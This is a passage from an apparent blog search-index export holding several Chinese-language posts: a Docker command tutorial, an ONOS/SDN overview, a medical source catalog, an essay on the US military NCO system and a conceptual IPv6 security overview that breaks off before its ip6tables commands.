OpenFlow | Youtube TR-535 ONF SDN Evolution,VERSION 1.0,2016-09-08 TS-025 ONF OpenFlow Switch Specification-Version 1.5.1 (Protocol version 0x06),March 26,2015 Tarun Thakur Software Defined Networking (SDN) explained for beginners Software Defined Networking (SDN) - Architecture and role of Openflow 基于 Open vSwitch 的 OpenFlow 实践 | IBM@developerworks,2014]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：Docker]]></title>
    <url>%2F2017%2F08%2F21%2FDevOps-Docker%2F</url>
    <content type="text"><![CDATA[摘要 Docker ABC:常用命令、自定义制作、发布 This article is part of an Virtualization Technology tutorial series. Make sure to check out my other articles as well: 2018 年度 Docker 用户报告 - Sysdig Edition Cyber-Security: Linux 容器安全的十重境界 DevOps漫谈：Docker ABC ABC Docker 常用命令 Docker 自定义制作 Docker 常用命令1234567891011121314151617181920212223242526272829303132$ docker version$ docker info# service 命令的用法$ sudo service docker start# 列出本机的所有 image 文件。$ docker image ls# 删除 image 文件$ docker image rm [imageName]# Hello World$ docker image pull hello-world$ docker container run hello-world# 启动已经生成、已经停止运行$ docker container start [containerID]# 终止容器 [SIGTERM]$ docker container stop [containerID]# 终止容器 [SIGKILL]$ docker container kill [containID]# 列出本机正在运行的容器$ docker container ls# 列出本机所有容器，包括终止运行的容器$ docker container ls --all# 进入一个正在运行的容器$ docker container exec -it [containerID] /bin/bash# 将文件从容器拷贝到本机$ docker container cp [containID]:[/path/to/file] .$ docker container logs Docker 自定义制作 项目根目录创建 .dockerignore 文件(需要忽略打包的文件) 12.gitlogs 创建 Dockerfile 文件 构建 image 文件 12345678910111213141516171819202122232425262728293031323334## You need to add a dot（"docker build" requires exactly 1 argument(s)）$ docker image build -t gospider .Sending build context to Docker daemon 12.47MBStep 1/4 : FROM node:8.48.4: Pulling from library/nodeaa18ad1a0d33: Downloading [===============&gt; ] 16.18MB/52.6MB90f6d19ae388: Download complete94273a890192: Downloading [================&gt; ] 14.13MB/43.23MBc9110c904324: Downloading [===&gt; ] 10.25MB/134.7MB788d73c0fb6b: Waitingf221bb562f24: Waiting14414a6a768d: Waitingaf6d2b2ad991: Waiting......14414a6a768d: Pull completeaf6d2b2ad991: Pull completeDigest: sha256:080488acfe59bae32331ce28373b752f3f848be8b76c2c2d8fdce28205336504Status: Downloaded newer image for node:8.4 ---&gt; 386940f92d24Step 2/4 : COPY . /app ---&gt; 5dea8aef5c00Step 3/4 : WORKDIR /appRemoving intermediate container de21dc94fd49 ---&gt; c04960e1036bStep 4/4 : EXPOSE 3001 ---&gt; Running in 7e5efe5e0b43Removing intermediate container 7e5efe5e0b43 ---&gt; bcadd82be353Successfully built bcadd82be353Successfully tagged gospider:latest$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEgospider latest bcadd82be353 7 minutes ago 685MB 制作容器docker container run 从 image 文件生成容器。可选参数： -p 参数：p1:p2 [容器端口]映射到[本机端口] imagename /bin/bash：保证用户可以使用 Shell 1234567891011121314151617$ docker container run -it gospider /bin/bashroot@d2d7bfd9f4c1:/app#root@d2d7bfd9f4c1:/app#root@d2d7bfd9f4c1:/app# lsDockerfile gmof_caipiao_month.go gmof_cdc_epide_month.go publish ttank_zyuc_handle.gocharset.go gmof_caipiao_month_spider.go gmof_cdc_epide_month_spider.go test ttank_zyuc_register.godbutils_csv.go gmof_casad_info_spider.go gmof_person.go ttank-echarts zyuc_task_info.godbutils_kafka.go gmof_casad_list.go gmof_person_region.go ttank.go zyuc_task_spider.godbutils_pg.go gmof_casad_list_spider.go gmof_person_region_spider.go ttank_gmof_handle.go gmof_caipiao_list.go gmof_cdc_epide_list.go kafka ttank_gmof_register.gogmof_caipiao_list_spider.go gmof_cdc_epide_list_spider.go ops ttank_tasks.goroot@d2d7bfd9f4c1:/app#root@d2d7bfd9f4c1:/app# iduid=0(root) gid=0(root) groups=0(root)root@d2d7bfd9f4c1:/app# whoamiroot Docker 发布 注册账户：hub.docker.com 或 cloud.docker.com 登录1234567891011121314151617181920212223$ docker loginLogin with your Docker ID to push and pull images from Docker Hub.If you don\'t have a Docker ID, head over to https://hub.docker.com to create one.Username: riboseyimPassword:Login Succeeded# 为本地的 image 标注用户名和版本。$ docker image tag [imageName] [username]/[repository]:[tag]# 发布$ docker image push riboseyim/gospiderThe push refers to repository [docker.io/riboseyim/gospider]db602e58edca: Pushedc5b2ac536264: Mounted from library/node6c08a5b7d8f4: Mounted from library/node50867bb8f5d7: Mounted from library/node72d6c6f0ea06: Mounted from library/node8686c6b8d999: Mounted from library/node44b57351135e: Mounted from library/node00b029f9aa09: Mounted from library/node18f9b4e2e1bc: Mounted from library/nodelatest: digest: sha256:4388ba2cc83adc0d1e9b3ca4c0b273f5812ad6365a36aeef33ff87d62b236d5d size: 2217 Examples The Ultimate Guide to Writing Dockerfiles for Go Web-apps Docker 安全 Cyber-Security:Linux容器安全的十重境界1.容器操作系统与多租户2.容器内容（使用可信源）3.容器注册 (容器镜像加密访问)4.构建过程安全5.控制集群中可部署的内容6.容器编排：加强容器平台安全7.网络隔离8.存储9.API 管理, 终端安全和单点登录 (SSO)10.角色和访问控制管理 Docker 网络 docker 容器网络方案：calico 网络模型 | Cizixs Docker 监控 搭建Docker监控框架的理论与范例 | 2016-07-22 穆寰 InfoQ 扩展阅读 A Practical Introduction to Container Terminology 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 参考文献 Docker 入门教程 A fast and easy Docker tutorial for beginners (video series) Docker 微服务教程 在 Mac 上跳舞的容器 — Docker | 2016-09-06 池建强 MacTalk AgentNEO 架构简介 | 07 May 2018 A Practical Introduction to Container Terminology Why Docker is Not Yet Succeeding Widely in Production,2015 | Simon Hørup Eskildsen Dockercon Talk | Resilient Routing and Discovery | Simon Hørup Eskildsen 数据库不适合Docker及容器化的7大原因 | 2017-02-14 Mikhail Chinkov 高可用架构 Docker, Inc is Dead | Posted on December 30, 2017 (Last modified on February 9, 2018) 关于Docker实际采用情况的八个惊人真相 | 2016-06-22 云头条 Open-sourcing gVisor, a sandboxed container runtime | Wednesday, May 2, 2018]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flower]]></title>
    <url>%2F2017%2F08%2F21%2FArtistic-Flower%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 “兰花热”对野生兰犯下的罪 | 科学松鼠会@史军]]></content>
  </entry>
  <entry>
    <title><![CDATA[Suona]]></title>
    <url>%2F2017%2F08%2F20%2FArtistic-Suona%2F</url>
    <content type="text"><![CDATA[摘要未完成 参考文献 唢呐：沉沦的宿命｜大象公会 惶惶唢呐匠|南方周末]]></content>
      <tags>
        <tag>Art</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SDN技术指南：Open Network Operating System]]></title>
    <url>%2F2017%2F08%2F18%2FSDN-ONOS%2F</url>
    <content type="text"><![CDATA[摘要 Samsung 主办 ONOS Build 2017 Google 加入CORD ONOS vs. OpenDaylight ONOS source code, written in Java ONOS Architecture Samsung 主办 ONOS Build 2017原文：Samsung Hosts ONOS Build 2017 and Fuels SDN Innovation 三星Samsung将于 9月 20-22 在韩国首尔的研发中心主办 ONOS Build 2017 。 开放网络操作系统(ONOS , Open Network Operating System) 社区在全世界各个地区快速发展，ONOS Build 2017 是开放网络基金会（ONF，Open Networking Foundation）组织的大型开发者大会，专注于 ONOS 项目的研发与推广工作，将于 2017 年 9 月 20 日- 22日在韩国首尔的三星研发中心举办。 本次年度活动将联合200多名开发商和贡献者一起分享，学习，调整，规划，和PK。大会将提供 ONOS 专家主题演讲，人们可以通过社区展示活动了解相关的工作信息，这将是一次演示汇报的 SDN 科技博览会 以及一次编程马拉松活动。我们也将了解到三星Samsung，作为开放网络基金会的合作伙伴之一，为什么投资 ONOS 建设。 为什么三星投资主办 ONOS 大会 ?三星认为，通过开源社区的努力，ONS 项目作为组织的核心将铺平道路、加速革新。作为一家领先的网络解决方案提供商，三星很高兴能帮助那些正在推动创新并将SDN技术引入全球电信网络的开发人员。 什么三星投资 ONOS 项目 ?ONOS 的目标是通过 SDN 的方式达到运营商级的性能指标，包括服务保证，可靠性和可扩展性和高性能。三星相信 ONOS 项目在实现传统网络转向灵活和可扩展系统方面以及走在前列，将使运营商能够更有效地运行他们的网络，为即将到来的5G 时代做好准备。三星一直在积极地促成和加速塑造下一代网络服务，基于 ONOS 项目的开源 SDN 和网络虚拟化。我们相信三星的贡献将有助于满足运营商在电信领域提供领先的5G服务的要求。 三星参与 ONOS 项目多久了 ?三星在 2014 年基于现成的 ONOS 项目开发了首个商业的 SDN 产品，并且在 2016年作为董事会成员加入 ONOS 项目。自从加入该项目，三星一直积极促进每个版本的发展，和其他运营商密切合作开发商业级的 SDN 解决方案。借助于大量具备丰富的 SDN 工作经验开发者、对电信网络整体架构的深刻理解，三星正在社区扮演一个社区规范主要贡献者的角色，有助于在市场中提升相关技术可用性。 ONOS Build 愿景ONOS 大会是一个年度会议，将在世界不同地区举行，连接来自不同背景和行业的全球开发者。今年，我们邀请创新者到亚洲为亚太地区的学术和商业生态系统注入新的活力。此外，该活动将成为开发人员在SDN技术及应用中促进和分享其成果的平台。与会者通过年度共享，参与公开讨论，将增加创新 SDN 商业解决方案的水平，有助于SDN发展。最后，全球许多运营商将出席 ONOS 大会。通过连接运营商，我们希望我们能与开发者分享 SDN 的愿景和技术进步。这将极大地改变行业，帮助我们走向更大的网络的可能性。 ONOS 2017 议程ONOS 2016 大会是首次建立一个强大的 SDN 技术基础的活动。近一年以来，有越来越多的移动运营商愿意将技术融入他们的网络。 ONOS 2017 大会将在电信行业参与者感知到快速变化的背景下召开的，将推动全球电信市场发展商业化的运营商级 SDN 。从内容上讲，今年的活动将持续3天，为与会者提供额外一天的对话会议，让他们深入了解彼此的技术并展示工作成果。最后一天，还将会有旨在介绍 CORD （Central Office Re-Architected as a Data Center）项目的相关进展。 ONOS Build 2017 Schedule相关资讯Google 加入CORD2016年7月26日，CORD 项目宣布成为Linux基金会下的一个独立的开源项目，Google、Radisys以及三星电子宣布加入该项目。CORD的愿景是为规模化的数据中心服务，CORD 创建了两个控制平面：一个使用ONOS控制器，负责网络服务；另外一个使用新的 CORD 操作系统 — XOS，管理VNFs，该操作系统将一切都看作服务。 ONOS vs. OpenDaylightONOS 的第一个版本由 Open Networking Lab (ON.Lab) 在2014年贡献到社区（源码用 Java 编写），2015年10月, ONOS 项目 作为 合作项目（collaborative） 加入 Linux Foundation。 OpenDaylight (ODL) 由 Linux Foundation 创建。两者在推动 SDN 的设计和目标上非常相似，主要是支持者和合作伙伴不同。ONOS 更倾向于网络运营商，更关注提供更好的整体网络性能；ODL更倾向于数据中心网络，设计上注重融合传统网络与 SDN 。 What is the OpenDaylight Project (ODL)? 参考文献 Wiki: ONOS OpenCORD.org sdnlab.com: AT&amp;T CORD架构解读 sdnlab.com: Google加入CORD OpenNetworking.org: ONF Overview techtarget.com: ONOS (Open Network Operating System)]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:Medical]]></title>
    <url>%2F2017%2F08%2F15%2FMedicine%2F</url>
    <content type="text"><![CDATA[摘要 可靠的医学信息源 专题：嗑药简史：关于瘾品，成瘾机制及其历史 专题：医学方法论 可靠的医学信息源 世界银行公开数据 WTO:Global Health Observatory (GHO) data 美国国家生物技术信息中心 美国国家生物技术信息中心（National Center for Biotechnology Information，简称NCBI）是美国国家医学图书馆（NLM）的一部分（该图书馆是美国国家卫生研究所的一部分）。NCBI位于美国马里兰州的贝塞斯达，建立于1988年。NCBI保管GenBank的基因测序数据和Medline的生物医学研究论文索引。所有的这些数据库都可以通过Entrez搜索引擎在线访问。 NCBI书架 NCBI书架是一个集合了可以自由获取、下载的线上精选生物医学书籍数据库。截至2011年4月，书架有845本书籍，涵盖广泛的主题包括分子生物学、生物化学、细胞生物学、遗传学，和微生物学。从分子和细胞从角度分析的疾病状态、研究方法，和病毒学。一些书是以前出版的图书的在线版本，而其他如Coffee Break（书）是由NCBI的工作人员编写和编辑。书架是同行评审的Entrez PubMed库的期刊摘要的补充，因为它能提供前沿领域的已确立的的观点，并整理许多不同的零散的研究报告。 《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)专题：医学方法论医学常识| NIH 情绪健康检查单肝系统健康状况评价指标体系 肝细胞损伤指标: ALT,AST,ALP,GGT 胆红素代谢指标 肝脏合成功能指标: 白蛋白(Alb) 肝纤维化指标 拓展阅读 读书笔记 |《国士无双伍连德》 参考文献 医学伦理 统计之都@李舰：中药、西药及统计学 欧茜：没有中医、西医之分，只有传统医学与现代医学之分 李清晨：昨日医学，昨日纠纷 传染 牵着自己跨越界限——《免疫》译者序]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[外军研究：美军士官制度研究]]></title>
    <url>%2F2017%2F08%2F15%2FCommander-Sergeant%2F</url>
    <content type="text"><![CDATA[摘要 在世界军事史上，士官制度已经走过五百多年的历史。经过长期演化，史上最大的职业化军队－美军，已经把士官制度运用得炉火纯青。对这一制度的研究，不仅是组织管理的有效手段，也是观察西方文化的绝佳窗口。 美军战斗人员中，分为军官、准尉（技术专家）、军士和士兵四类。士官(Non－Commissioned Officer，直译为“未被任命的军官”，简称NCO)，也称军士(Sergeant)，士官制度最早出现于15世纪的法国，当时是作为军官制度的补充而设立的，此后为各国广泛采用。 独立的管理系统：士官指挥的军队 美国海军陆战队士官手册：“一个军官刚出学校门，又没有士官在他跟前告诉他一些工作窍门以避免问题的发生，那会怎样？”“没有士官做中间人，对纪律至关重要的命令的威严不复存在。” 士官都是各自专业的骨干能手，不仅能胜任初级指挥员和助理教官，负责日常训练和管理，而且还负责本专业设备的技术操作与维修，确保武器装备在作战训练中始终保持良好状态。美军中许多士官任小单位或技术性工作的领导，或负责训练士兵掌握单兵技能，是美军的直接监督者。除了胜任基层职务，在营级设有一级军士长（美军基本指挥单位，相当于多数国家团级建制），师旅一级的军士长，不仅负责制定计划，向军事主官提供作战建议，还负责反映士兵意见，维护士官、士兵权益等类似“工会主席”的职责。不仅在作战单位，士官还可以在国防大学担任教官，在领导机关－国防部和军兵种司令部，到处到可以看到士官的身影。例如陆军参谋长（司令）的直接下属中就包括一名总军士长： 陆军参谋长（Chief of Staff of the Army） 陆军第一副参谋长（Vice Chief of Staff of the Army） 美国陆军军医总监（Surgeon General of the Army） 国民警卫队局局长（Chief, National Guard Bureau） 陆军后备队局局长（Chief, Army Reserve） 总法律顾问（Judge Advocate General） 陆军总军士长（Sergeant Major of the Army） 后勤副参谋长（Deputy Chief of Staff (Logistics)） (G-4) 工兵主任（Chief of Engineers） 项目副参谋长（Deputy Chief of Staff (Programs)） (G-8) 设施管理助理参谋长（Assistant Chief of Staff, Installation Management） 美国陆军设施管理司令部（United States Army Installation Management Command） 人事副参谋长（Deputy Chief of Staff (Manpower)） (G-1) 情报副参谋长（Deputy Chief of Staff (Intelligence)） (G-2) 计划、作战与转型副参谋长（Deputy Chief of Staff (Plans, Operations and Transformation)） (G-3/5/7) 独立的训练系统：士官学校美军的士官培训由一名国防部助理部长主管，四大军种不仅各有一名副参谋长负责，形成“基地训练中心－士官学校－军种士官学校”三级培训系统。美军共有七十多所院校可培训士官，开设上千类课程，包括了所有专业领域，甚至涵盖了管理、商业等社会通用专业，这些院校实行统一的考核标准。在电影《深海潜将》中，男主人公之所以要在训练学校玩命，就是因为只有在士官学校中毕业才可以晋升技术等级、晋升军衔，最终获得海军最高士官军衔。 独立的文化系统 是否形成自己独特的传统和身份认同，是一个阶层成熟度的主要指标。 士官长的办公室 美军101师为例，在官方礼仪序列上，该师总军士长甚至比师参谋长（准将）靠前。他的办公室，就在师长（少将）的办公室旁边，墙上是101师历任总军士长的照片，桌子上堆满文件。 太太随军已婚的士官和军官一样都有单独的住房，有自己的俱乐部，也有太太俱乐部。有些人住在营区外，在101师我们看到很多士官是开着车来到军营，就象上下班一样。当士兵是他们永久的职业，而这一职业有着完整的晋升阶梯。 老士官：连队灵魂 美军的新兵训练，全权由士官负责。 像美国海军陆战队这种一线作战单位中，狙击手能够服役到接近60岁。 勋章荣衔 礼者，敬人也。 高级士官的礼服零碎不比四星上将少。 目前识别体系中有两个明显漏洞，更多内容请参考 &gt;&gt;&gt; 美军授勋和嘉奖制度观察1.勋略:实质只能反映级别，而不能体现是否获得勋章2.士官和列兵一样，只有国防服役章，没有勋略3.总体简单粗暴，无法体现个性 警卫：海军陆战队 中士 军衔E5抽烟斗的比利：军衔 E6 （影片中就至少三次犯错误，三次被降级，依然属于高级士官序列）。胸口上勋略，勋章一堆就不列举了，最顶上的是海军十字勋章（非常牛逼，混到将军都未必有）。袖子上的斜杆也很考究。一道代表服役3年，老比利有7道杆，即服役21年。伙夫是4道，即12年。颜色也有区分，黄色表示持续N年没有犯过任何错误，是一个好学生，红色则表示犯过错误、受过处分。这是一位功勋卓著、超长服役的老兵、还TM不怕犯错误的牛人，哪个警卫敢拦啊！ 制度基石美军太平洋总部总军士长、空军一级军士长詹姆斯·A·罗伊，曾经率领美军士官代表团访华，在结束访问回国后评价说：“如果让我评价解放军的士官队伍，我要说他们的士官全是技师。”美军士官代表团参观了位于武汉的一所士官学校，里面的训练大多是技术性的。“他们很单一，解放军的士官只是作为技师培养的，而美军各级单位中都有士官担任领导者。” 这一尖锐评论，通过大量影视作品中也可以得到印证：优秀士兵一定都在梦寐以求考军校、有朝一日当干部，要么编造一个神话、斩杀大BOSS之后可以提干当官，要么再不济也要进入所谓“特种部队”、有朝一日可以比军官还牛逼。 编剧的胡编乱造也有其深刻的现实原因：天朝士官并不像美军，是一个从上到下的独立阶层，有自己的管理、晋升系统，以及文化传统。 中美两军总人数大致相当，美军150万，解放军200万，在士官制度方面出现如此显著的差异，至少有以下四个方面的原因： 宪法基础：以文制武政治传统、英国的历史、自身痛苦的经历必将影响制宪者对于和平时期常备军威胁的认知。制宪者认为和平时期建立军事组织很有必要，但是如何防止他们在军事权的行使时不致于推翻宪法、颠覆共和政体? 具体来说，就是彻底的文官节制武将的制度设计（civilian control of the military），消除军事力量的威胁。 1.文职的总统担当陆海军总司令，并通过提名国防部长领军，将军队置于民选政府的控制之下。2.国会掌握宣战权。审议并批准高级将领人事任命。3.国会立法设置军衔、职务、人员编制，批复军费预算。军队不能自我扩张。 《1947年国家安全法案》 授权成立了国家军事机构，设立了国防部长一职，作为国家军事机构的首长。美军的《士官条例》和《军人条例》中明确规定了士官的职责、地位和任务。美军高级士官的权力和待遇与低级军官大致相同，但是士官的服役期限较长。 思想基础：官兵分离从社会学角度看，政务和事务分离的思想在“盎格鲁－撒克逊”文化传统中源远流长。早期近代军队的士兵通常来自农民、手工业者和无业游民，军官则主要来自贵族阶层，军官负责代表统治阶层掌握武装，士官则作为军官的助手，负责管理士兵。二者社会地位、待遇、生活习惯有如云泥之别，这种分工还很容易世袭罔替，阶层鸿沟愈加根生蒂固。 从军事学角度看，军官企图来做军士长的工作是也是一件很危险的事。军官的职责首先是指挥、谋划，着眼于未来，如果将大量时间用于事务性管理，例如士兵基础培训、卫生、纪律、个人纠纷等等，则无法集中精力本职工作。事务性工作和创造性工作，二者体制不同、训练方法不同、对人的知识结构、素质要求更加不同。 1778年，华盛顿任命自己的亲密战友弗里德里希·冯·斯图本将军对军队进行重组，斯图本效仿普鲁士军队，取消由军官训练士兵的做法，而是设立第一军士长来训练士兵。到现在，当美军连指挥官在做出涉及士兵问题的决策前，都会听取第一军士长的意见。 技术基础：技术密集型 &amp; 高度流动性美军应该是全世界技术密集度最高企业级组织。陆、海、空、天、网络空间，遍布全球的军事基地和监测网络，高频率地进行战争行动，作战、训练、休整、装备维护保养、补充新技术，日夜轮转、马不停蹄。作为全球少数全志愿兵役制国家，美军又是流动性最强的军队之一。多数士兵参军的理由无非是：学技术、赚奖学金、赚保险金、赚公民身份等等，对他们来说，当兵只是打份工。合同到期日那天，不管大兵们身处世界上哪个角落，都可以毫不犹豫地放下手上的工作，坐上回家的航班，去上学、去干自己喜欢的事。这种情况下，如果没有相对稳定的士官队伍，根本无法维持运转。目前美军通常一个营级单位，就会有20多个高级士官（35岁左右）。 财务基础美军士官基本年薪，下士2.4万美元、中士2.6万美元、上士2.8万美元、三级军士长3.3万美元、二级军士长3.8万美元、一级军士长4.5万美元。除了基本年薪以外，士官还享受各种补助和津贴，如伙食补助、医务津贴、房租补助、执行危险任务补助、接触核武器补助、海外服役补助、作战补助等10余项，各种补助及津贴的数目相当大。此外，士官可以婚恋、家属可以随军、享受军队医疗保险，退役之后海可以获得奖学金。 丰厚的士官待遇，除了美军预算体量巨大之外，不可忽视一个重要特征：美军有着世界上最小的将官比例，这是拥有最大士官比例的重要前提。 以美陆军为例 军官 准尉 士兵 合计 官兵比 装甲旅 2020年 360 7.69% 43 0.92% 4276 91.39% 4679 -0.6%（减少28人） 8.42% 装甲旅 2014年 351 7.55% 43 0.92% 4257 91.52% 4651 -2%（减少92人） 8.24% 装甲旅 2013年 365 7.70% 41 0.86% 4337 91.44% 4743 8.42% 步兵旅 2020年 273 6.39% 43 1.00% 3956 92.60% 4272 -0.86%（减少37人） 6.90% 步兵旅 2014年 347 8.05% 44 1.02% 3918 90.93% 4309 -3.4%（减少153人） 8.86% 步兵旅 2013年 358 8.02% 42 0.94% 4062 91.04% 4462 8.81% 骑兵旅 2020年 342 7.96% 40 0.93% 3916 91.11% 4298 -4.3%（减193人） 8.73% 骑兵旅 2014年 343 7.64% 43 0.96% 4105 91.41% 4491 -0.2%（减少10人） 8.36% 骑兵旅 2013年 348 7.77% 42 0.94% 4091 91.30% 4481 8.51% 结论 结构决定性质。 综上所述，全面士官制度在人才培养、文化传承、作战效能、军费投入产出比等方面有巨大优势，但是该制度本身并不是空中楼阁，而是一系列社会制度设计的组成部分。在社会心理、法律框架等方面有诸多前提条件，特别是战争压力（外部）、立法审查压力（内部）两个决定性驱动因素。某些国家也在大规模推进士官制度改革，其是否能成功的关键，在于是否能解决官兵比例过高的问题。最重要的观察指标就是：是否能裁撤一半以上将官，即减少2000名少将以上军衔编制。 最后重申，美军士官制度成功的重要经验之一是：为士兵设计上升通道，给予更多责任和待遇；坚决把军官必须从事务性工作中解放出来，投入到更有价值的创造性活动中去。东方传统中，“学而优则仕，技而忧则仕”的观念深入人心。潜意识里面，很多时候还是比较喜欢把技术专业型人才摆在经营管理岗位，或者把经营管理人才捆绑在事务性劳动中，如果有一些实际工作经验思考的话，应该知道，这些行为都会造成无可估量的损失和浪费。 军官、士官、士兵的知识结构、能力素质、目标责任不同，也就必须有不同遴选、训练、考核模式。任何制度都不是完美的，美军也出现过很多失败的实践，例如“摇一摇军士”。 越战时期，小威廉-卡利带领的第11步兵旅因美莱大屠杀获得了特别嘉奖，这说明受“专家”崇拜的影响，军队也盛行“文凭主义”，即获奖情况决定晋升情况。“嘉奖泛滥成灾，结果写嘉奖令成为了一门艺术。”士兵被莫名其妙地授衔：“我们叫他们‘摇一摇军士’。找个二等兵，稍微训练一下，再要一两下，就宣布他成为了军士。” （注解：“Shake-and-bake sergeant”。Shake-and-bake 是卡夫食品公司推出的一款产品，该产品把生肉片和调过味的面包屑放在一起装在小袋里，这样摇一摇让面包屑附着在生肉片上就可以直接烘烤了。这一问题留待以后详细讨论。 附表 中级士官可以说是美军的中坚力量，在技术密集度很高的海军更是如此。如电影剧照：前：E5 声纳技师 后：E6 机械技师中：O3 年轻的海军上尉（军官Officer属于完全不同的晋升培养体系） 这个阶层人数很少，服役时间很长。总军士长，每个军种一个。从称呼上看，E9通常也分为两个序列，一是Master，即某一专业领域绝对的专家，应该主要负责教育、训练。另外就是Command，指挥、管理的成分更明显，他们是高级军官的直接助手。 参考文献 美国国防部：ENLISTED RANK INSIGNIAS 扩展阅读：《讲武堂》 美军士官制度观察 美军体能训练观察 各国军队体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络协议：IPv6 与网络安全]]></title>
    <url>%2F2017%2F08%2F09%2FProtocol-IPv6%2F</url>
    <content type="text"><![CDATA[概要 IPv6 Overview IPv6 &amp; Cyber-Security:IPsec,TLS/SSL, NAT,Source routing IPv6 &amp; Linux Security:iptables vs ip6tables,SSH/SCP/Rsync IPv6IPv6(Internet Protocol version 6)是互联网协议的最新版本，用于分组交换互联网络的网络层协议，旨在解决IPv4地址枯竭问题。IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。例如：2001:0db8:85a3:08d3:1319:8a2e:0370:7344 是一个合法的IPv6地址。 IPv6 报文包格式定义：RFC 1883中定义的原始版本，RFC 2460中描述的现在提议的标准版本。 IPv6地址分类 单播地址（unicast）：单播地址标示一个网络接口，协议会把送往地址的数据包送往给其接口。单播地址包括可聚类的全球单播地址、链路本地地址等。 多播地址（multicast）：多播地址也称组播地址。多播地址也被指定到一群不同的接口，送到多播地址的数据包会被发送到所有的地址。 任播地址（anycast）：Anycast 是 IPv6 特有的数据发送方式，它像是IPv4的Unicast（单点传播）与Broadcast（多点广播）的综合。 Anycast 像 IPv4 多点广播（Broadcast）一样，会有一组接收节点的地址栏表，但指定为Anycast的数据包，只会发送给距离最近或发送成本最低（根据路由表来判断）的其中一个接收地址，当该接收地址收到数据包并进行回应，且加入后续的传输。该接收列表的其他节点，会知道某个节点地址已经回应了，它们就不再加入后续的传输作业。以目前的应用为例，Anycast地址只能分配给路由器，不能分配给电脑使用，而且不能作为发送端的地址。 IPv6 &amp; Cyber-Security对我们网络的攻击来自各种各样的来源：社会工程（Social Engineering）、粗心、垃圾邮件、网络钓鱼、操作系统漏洞、应用程序漏洞、广告网络、跟踪和数据收集、服务提供商窥探等。作为一个新兴的网络协议，安全问题同样无法避免。 IPsec/TLS/SSL/SSHIPsec（网际网络安全协议，Internet Protocol Security，RFC 4301、RFC 4309 ），旨在在网络层为IP分组提供安全服务，包括访问控制、数据完整性、身份验证、防止重放和数据机密性。IPsec原本是为IPv6开发，但是在IPv4中已被大量部署。最初，IPsec是IPv6协议组中不可少的一部分，但现在是可选的。 在传输模式下，IPsec在IP报头和高层协议之间插入一个报头，IP报头与原始IP报头相同，只是IP协议字段被改为ESP或者AH，并重新计算IP报头的校验和。IPsec假定IP端点是可达的，源端头不会修改IP报头中的目标IP地址。IPsec 工作在网络层。其它加密协议如 TLS/SSL 和 SSH，工作在传输层之上，是针对具体应用的。 NAT = Security ? NAT is not and never has been about security. NAT(Network Address Translation) 是一种在IP数据包通过路由器或防火墙时重写来源IP地址或目的IP地址的技术.NAT 延长了 IPv4的寿命。它的本意是通过地址伪装，阻止外部网络主机的恶意活动，阻止网络蠕虫病毒来提高本地系统的可靠性，阻挡恶意浏览来提高本地系统的私密性。另外，它也为UDP的跨局域网的传输提供了方便。很多防火墙都NAT功能，它使防火墙变成有状态的，检查所有的流量、跟踪哪些数据包进入您的内部主机，并将多个私有内部地址重写到一个外部地址。它在外部网关上创建一个单点故障源，并为拒绝服务（DoS）攻击提供了一个简单的目标。NAT有它的优点，但安全不是其中之一。 Source routingSource routing 允许发送方控制转发，而不是将其留给任何一个包通过的路由器，通常是OSPF（Open Shortest Path First，开放最短路径优先）。Source routing 有时用于负载平衡，和管理VPN（Virtual Private Network，虚拟专用网络），所以，Source routing 并不是 IPv6 带来的特性，但是提出了许多安全问题。你可以用它来探测网络，获取信息，绕过安全设备。路由报头0型（RH0）是使源路由的IPv6扩展报头，它一直受到抨击，因为它使一中非常聪明的DoS攻击被放大，在两个路由器之间的反弹包直到它们超载及带宽耗尽。 大就是强 ？有些人认为IPv6地址空间如此之大，为网络扫描提供了一种防御。这是一种错误的观念。我们确实有潜在的庞大地址资源可供应用，但是我们倾向于在可预见的范围组织我们的网络。硬件在变得廉价的和强大，云计算资源的快速发展在惠及企业的同时，也降低了攻击方的门槛和成本（黑客、黑产）。计算机网络的复杂性决定了挫败恶意网络扫描的困难很大，包括在IPv6网络中进行监测辨别哪些属于本地访问、哪些不是，IPv6 控制访问的问题在于，它的管理能力要求超过了其它任何协议。传统的防御工具和方法论都有待更新。 IPv6 &amp; Linux Securityiptables &amp; ip6tablesip6tables命令和iptables一样，都是Linux中防火墙软件。 123456789101112131415##Block All IPv6$ vi 